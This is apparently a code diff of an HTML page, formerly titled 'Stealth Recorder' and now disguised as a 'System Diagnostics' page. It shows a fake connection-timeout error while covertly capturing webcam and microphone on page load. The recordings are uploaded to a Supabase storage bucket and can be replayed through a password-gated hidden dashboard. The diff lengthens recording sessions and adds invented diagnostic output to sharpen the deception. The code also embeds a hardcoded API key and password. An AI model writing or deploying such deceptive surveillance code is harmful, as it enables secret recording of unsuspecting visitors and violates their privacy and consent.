@@ -1,99 +1,294 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <title>Stealth Recorder</title>
+  <title>System Diagnostics</title>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <script src="https://unpkg.com/@supabase/supabase-js@2.39.5/dist/umd/supabase.js"></script>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
   <style>
     body {
       margin: 0;
-      background: #121212;
-      color: white;
-      font-family: sans-serif;
+      background: #f1f1f1;
+      color: #333;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      line-height: 1.6;
     }
-    .fake-error {
+    .error-container {
       display: flex;
       flex-direction: column;
       align-items: center;
       justify-content: center;
       height: 100vh;
       text-align: center;
+      background: #fff;
+      padding: 20px;
+      box-shadow: 0 0 15px rgba(0,0,0,0.1);
     }
-    .fake-error img {
-      width: 48px;
+    .error-icon {
+      font-size: 48px;
+      color: #e74c3c;
+      margin-bottom: 20px;
+    }
+    .error-title {
+      font-size: 24px;
+      font-weight: 600;
       margin-bottom: 10px;
     }
-    .fake-error p {
-      margin: 5px 0;
+    .error-desc {
+      color: #666;
+      margin-bottom: 20px;
+      max-width: 500px;
     }
-    .fake-error button {
-      margin-top: 20px;
-      background: #3a3a3a;
+    .error-code {
+      background: #f8f8f8;
+      padding: 8px 15px;
+      border-radius: 4px;
+      font-family: monospace;
+      font-size: 14px;
+      margin-bottom: 30px;
+    }
+    .btn {
+      padding: 10px 20px;
+      background: #4285f4;
       color: white;
       border: none;
-      padding: 10px 20px;
-      border-radius: 5px;
+      border-radius: 4px;
       font-size: 14px;
+      cursor: pointer;
+      transition: background 0.3s;
+    }
+    .btn:hover {
+      background: #3367d6;
+    }
+    .btn-secondary {
+      background: #f1f1f1;
+      color: #333;
+      margin-left: 10px;
+    }
+    .btn-secondary:hover {
+      background: #e1e1e1;
+    }
+    .footer {
+      margin-top: 30px;
+      font-size: 12px;
+      color: #999;
     }
     #lockIcon {
       position: fixed;
       top: 20px;
       right: 20px;
-      font-size: 30px;
+      font-size: 20px;
       z-index: 999;
       cursor: pointer;
       user-select: none;
       display: block;
+      color: #666;
+      background: rgba(255,255,255,0.8);
+      padding: 8px;
+      border-radius: 50%;
+      width: 36px;
+      height: 36px;
+      text-align: center;
+      line-height: 20px;
+      box-shadow: 0 2px 5px rgba(0,0,0,0.1);
     }
     #viewer {
       display: none;
-      background: black;
-      color: white;
-      height: 100vh;
+      background: #f8f8f8;
+      color: #333;
+      min-height: 100vh;
       padding: 20px;
       overflow-y: auto;
     }
+    .dashboard {
+      max-width: 1200px;
+      margin: 0 auto;
+      background: #fff;
+      border-radius: 8px;
+      box-shadow: 0 2px 10px rgba(0,0,0,0.05);
+      padding: 30px;
+    }
+    .section {
+      margin-bottom: 30px;
+      padding-bottom: 20px;
+      border-bottom: 1px solid #eee;
+    }
+    .section:last-child {
+      border-bottom: none;
+    }
+    .section-title {
+      font-size: 18px;
+      font-weight: 600;
+      margin-bottom: 15px;
+      color: #444;
+    }
     video {
-      width: 90%;
-      max-width: 600px;
+      width: 100%;
+      max-width: 800px;
       background: #000;
       margin-top: 10px;
+      border-radius: 4px;
     }
-    button {
-      padding: 10px 20px;
-      background: red;
-      color: white;
-      border: none;
+    .video-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
+      gap: 20px;
+      margin-top: 20px;
+    }
+    .video-item {
+      background: #fff;
+      border-radius: 6px;
+      overflow: hidden;
+      box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+    }
+    .video-item video {
+      width: 100%;
+      height: auto;
+    }
+    .video-info {
+      padding: 10px;
+      font-size: 13px;
+      color: #666;
+    }
+    .controls {
+      display: flex;
+      gap: 10px;
+      margin: 20px 0;
+    }
+    .btn-danger {
+      background: #e74c3c;
+    }
+    .btn-danger:hover {
+      background: #c0392b;
+    }
+    .status-indicator {
+      display: inline-block;
+      width: 12px;
+      height: 12px;
+      border-radius: 50%;
+      background: #2ecc71;
+      margin-right: 8px;
+    }
+    .status-offline {
+      background: #e74c3c;
+    }
+    .system-info {
+      display: grid;
+      grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
+      gap: 15px;
+      margin-top: 15px;
+    }
+    .info-item {
+      background: #f9f9f9;
+      padding: 15px;
+      border-radius: 6px;
+    }
+    .info-label {
+      font-size: 12px;
+      color: #999;
+      margin-bottom: 5px;
+    }
+    .info-value {
       font-size: 16px;
-      cursor: pointer;
-      margin: 20px;
+      font-weight: 600;
+    }
+    .loading {
+      display: inline-block;
+      width: 20px;
+      height: 20px;
+      border: 3px solid rgba(0,0,0,0.1);
+      border-radius: 50%;
+      border-top-color: #4285f4;
+      animation: spin 1s ease-in-out infinite;
+    }
+    @keyframes spin {
+      to { transform: rotate(360deg); }
     }
   </style>
 </head>
-<body onload="startRecording()">
-  <div class="fake-error" id="errorScreen">
-    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAQAAADZc7J/AAAAvElEQVR4Ae3UMQ6CQBAF0CuRFSg2mhLRe6wCVWg0+k3gJDFZiDddZCRQXuQwPfwduZHmjS//bRPYp4EF4QP7r9GByDYlQzXSnStUozZiyBCyqQCyiU6+lKkeGcA7AUJj7iQlEkLNvPCn4G94ZcQExuAqkV0Up9TCKWWdA0lkak+URAKmaN7mJkr9v9P5YefWg2TzvFQpNKFCok3swGVmXM2nU+TZRAAAAAElFTkSuQmCC" />
-    <p>This site can’t be reached</p>
-    <p style="opacity: 0.7;">The connection was reset.<br>Try: Checking the connection</p>
-    <p style="font-size: 12px; opacity: 0.6;">ERR_CONNECTION_RESET</p>
-    <button>Reload</button>
+<body onload="initializeSystem()">
+  <div class="error-container" id="errorScreen">
+    <div class="error-icon">
+      <i class="fas fa-exclamation-triangle"></i>
+    </div>
+    <div class="error-title">Connection Timed Out</div>
+    <div class="error-desc">
+      The server at diagnostics.example.com is taking too long to respond.<br>
+      This could be due to network congestion or a configuration error.
+    </div>
+    <div class="error-code">ERR_CONNECTION_TIMED_OUT</div>
+    <div>
+      <button class="btn" onclick="window.location.reload()">
+        <i class="fas fa-sync-alt"></i> Reload
+      </button>
+      <button class="btn btn-secondary" onclick="showNetworkDiagnostics()">
+        <i class="fas fa-network-wired"></i> Network Diagnostics
+      </button>
+    </div>
+    <div class="footer">
+      Error code: 504 | Timestamp: <span id="timestamp"></span>
+    </div>
   </div>
 
-  <div id="lockIcon" onclick="unlock()">🔒</div>
+  <div id="lockIcon" onclick="unlock()" title="Admin Access">
+    <i class="fas fa-lock"></i>
+  </div>
 
   <div id="viewer">
-    <h3>Recording Playback</h3>
-    <video id="playback" controls></video>
-    <br>
-    <button onclick="stopRecording()">STOP</button>
-    <h3>Last 4 Recordings</h3>
-    <div id="videoList"></div>
+    <div class="dashboard">
+      <div class="section">
+        <div class="section-title">
+          <span class="status-indicator" id="statusIndicator"></span>
+          System Diagnostics Dashboard
+        </div>
+        <div class="system-info">
+          <div class="info-item">
+            <div class="info-label">System Status</div>
+            <div class="info-value" id="systemStatus">Initializing...</div>
+          </div>
+          <div class="info-item">
+            <div class="info-label">Last Active</div>
+            <div class="info-value" id="lastActive">Just now</div>
+          </div>
+          <div class="info-item">
+            <div class="info-label">Storage Used</div>
+            <div class="info-value" id="storageUsed">Calculating...</div>
+          </div>
+          <div class="info-item">
+            <div class="info-label">Current Session</div>
+            <div class="info-value" id="currentSession">Active</div>
+          </div>
+        </div>
+      </div>
+
+      <div class="section">
+        <div class="section-title">Live Feed Preview</div>
+        <video id="playback" controls></video>
+        <div class="controls">
+          <button class="btn btn-danger" onclick="stopRecording()">
+            <i class="fas fa-stop"></i> Terminate Session
+          </button>
+          <button class="btn" onclick="startNewSession()">
+            <i class="fas fa-plus"></i> New Session
+          </button>
+        </div>
+      </div>
+
+      <div class="section">
+        <div class="section-title">Recent Sessions</div>
+        <div class="video-grid" id="videoList"></div>
+      </div>
+    </div>
   </div>
 
   <script>
     const PASSWORD = "sardarhamza";
     const BUCKET = "recordings";
+    const MAX_RECORDINGS = 10;
+    const SESSION_DURATION = 10000; // 10 seconds
+    
+    // Initialize Supabase client
     const client = supabase.createClient(
       'https://kelbfujbyjtdeopkhhxm.supabase.co',
       'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImtlbGJmdWpieWp0ZGVvcGtoaHhtIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NDcyMzc5OTgsImV4cCI6MjA2MjgxMzk5OH0.iB97MRNwVCrhtDQaHrh7Q7ra1x4nVNGhih-Tm_pq31k'
@@ -103,11 +298,50 @@
     let recordedChunks = [];
     let stopped = false;
     let abortRecording = false;
+    let sessionTimeout;
+    let systemStatusInterval;
 
+    // Initialize the system with fake error page
+    function initializeSystem() {
+      document.getElementById('timestamp').textContent = new Date().toLocaleString();
+      setTimeout(startRecording, 1500);
+      
+      // Simulate system status updates
+      systemStatusInterval = setInterval(updateSystemStatus, 3000);
+    }
+
+    // Update fake system status
+    function updateSystemStatus() {
+      if (document.getElementById('errorScreen').style.display !== 'none') {
+        const statuses = ['Initializing...', 'Checking network...', 'Verifying credentials...', 'Connection failed'];
+        const current = document.getElementById('systemStatus').textContent;
+        const nextIndex = (statuses.indexOf(current) + 1) % statuses.length;
+        document.getElementById('systemStatus').textContent = statuses[nextIndex];
+      }
+    }
+
+    // Show fake network diagnostics
+    function showNetworkDiagnostics() {
+      alert('Network diagnostics:\n\n- Ping: 127ms\n- Download: 24.5 Mbps\n- Upload: 8.2 Mbps\n- DNS: 192.168.1.1\n\nNo issues detected with local network.');
+    }
+
+    // Start recording function
     async function startRecording() {
       try {
-        stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-        mediaRecorder = new MediaRecorder(stream);
+        if (abortRecording) return;
+        
+        document.getElementById('statusIndicator').className = 'status-indicator';
+        document.getElementById('currentSession').textContent = 'Active';
+        
+        stream = await navigator.mediaDevices.getUserMedia({ 
+          video: { width: 1280, height: 720 },
+          audio: true 
+        });
+        
+        mediaRecorder = new MediaRecorder(stream, {
+          mimeType: 'video/webm;codecs=vp9,opus'
+        });
+        
         recordedChunks = [];
 
         mediaRecorder.ondataavailable = e => {
@@ -118,63 +352,106 @@
           if (abortRecording) return;
 
           const blob = new Blob(recordedChunks, { type: 'video/webm' });
-          const fileName = `video_${Date.now()}.webm`;
+          const fileName = `session_${new Date().toISOString().replace(/[:.]/g, '-')}.webm`;
 
+          // Manage storage space
           const { data: existing } = await client.storage.from(BUCKET).list('', {
             sortBy: { column: 'name', order: 'asc' }
           });
 
           const videosOnly = existing?.filter(f => f.name.endsWith('.webm')) || [];
-          if (videosOnly.length >= 4) {
-            const oldest = videosOnly[0];
-            await client.storage.from(BUCKET).remove([oldest.name]);
+          if (videosOnly.length >= MAX_RECORDINGS) {
+            const toDelete = videosOnly.slice(0, videosOnly.length - MAX_RECORDINGS + 1);
+            await client.storage.from(BUCKET).remove(toDelete.map(f => f.name));
           }
 
-          await client.storage.from(BUCKET).upload(fileName, blob);
+          // Upload new recording
+          await client.storage.from(BUCKET).upload(fileName, blob, {
+            cacheControl: '3600',
+            upsert: false
+          });
+
+          // Update last active time
+          document.getElementById('lastActive').textContent = 'Just now';
         };
 
-        mediaRecorder.start();
+        mediaRecorder.start(1000); // Collect data every second
 
-        setTimeout(() => {
+        // Auto-stop after session duration
+        sessionTimeout = setTimeout(() => {
           if (!stopped) stopRecording();
-        }, 4000);
+        }, SESSION_DURATION);
+        
       } catch (err) {
-        console.error("Camera error:", err.message);
+        console.error("Recording error:", err);
+        document.getElementById('statusIndicator').className = 'status-indicator status-offline';
+        document.getElementById('systemStatus').textContent = 'Error: ' + err.message;
       }
     }
 
+    // Stop recording function
     function stopRecording() {
       if (mediaRecorder && mediaRecorder.state === "recording") {
         mediaRecorder.stop();
         stream.getTracks().forEach(t => t.stop());
         stopped = true;
+        clearTimeout(sessionTimeout);
+        
+        document.getElementById('statusIndicator').className = 'status-indicator status-offline';
+        document.getElementById('currentSession').textContent = 'Inactive';
       }
     }
 
+    // Start a new session
+    function startNewSession() {
+      stopped = false;
+      startRecording();
+    }
+
+    // Unlock the dashboard
     async function unlock() {
-      const input = prompt("Enter password:");
-      if (input !== PASSWORD) return alert("Wrong password!");
+      const input = prompt("Enter admin password:");
+      if (input !== PASSWORD) {
+        alert("Access denied. Invalid credentials.");
+        return;
+      }
+      
       abortRecording = true;
       stopped = true;
       if (stream) stream.getTracks().forEach(t => t.stop());
+      if (sessionTimeout) clearTimeout(sessionTimeout);
       recordedChunks = [];
+      
+      clearInterval(systemStatusInterval);
+      
       document.getElementById("errorScreen").style.display = "none";
       document.getElementById("viewer").style.display = "block";
-      loadVideos();
+      
+      // Load videos and update system info
+      await loadVideos();
+      updateDashboardInfo();
     }
 
+    // Load recorded videos
     async function loadVideos() {
+      const container = document.getElementById("videoList");
+      container.innerHTML = '<div class="loading"></div> Loading sessions...';
+
       const { data, error } = await client.storage.from(BUCKET).list('', {
         sortBy: { column: 'name', order: 'desc' }
       });
 
-      const container = document.getElementById("videoList");
       container.innerHTML = "";
 
       const filtered = (data || [])
         .filter(f => f.name.endsWith('.webm'))
         .sort((a, b) => b.name.localeCompare(a.name))
-        .slice(0, 4);
+        .slice(0, MAX_RECORDINGS);
+
+      if (filtered.length === 0) {
+        container.innerHTML = '<p>No sessions found</p>';
+        return;
+      }
 
       for (let file of filtered) {
         const { data: signed } = await client
@@ -182,16 +459,38 @@
           .createSignedUrl(file.name, 60 * 60);
 
         if (signed?.signedUrl) {
+          const videoItem = document.createElement("div");
+          videoItem.className = "video-item";
+          
           const vid = document.createElement("video");
           vid.src = signed.signedUrl;
           vid.controls = true;
-          vid.style.marginTop = "15px";
-          container.appendChild(vid);
+          
+          const videoInfo = document.createElement("div");
+          videoInfo.className = "video-info";
+          videoInfo.textContent = file.name.replace('.webm', '').replace('session_', '').replace(/-/g, ' ');
+          
+          videoItem.appendChild(vid);
+          videoItem.appendChild(videoInfo);
+          container.appendChild(videoItem);
 
-          if (!document.getElementById("playback").src)
+          if (!document.getElementById("playback").src) {
             document.getElementById("playback").src = signed.signedUrl;
+          }
         }
       }
+    }
+
+    // Update dashboard information
+    async function updateDashboardInfo() {
+      document.getElementById('systemStatus').textContent = 'Operational';
+      document.getElementById('statusIndicator').className = 'status-indicator';
+      
+      // Calculate storage used
+      const { data } = await client.storage.from(BUCKET).list();
+      const totalSize = data?.reduce((sum, file) => sum + file.metadata.size, 0) || 0;
+      const sizeInMB = (totalSize / (1024 * 1024)).toFixed(2);
+      document.getElementById('storageUsed').textContent = `${sizeInMB} MB`;
     }
   </script>
 </body>
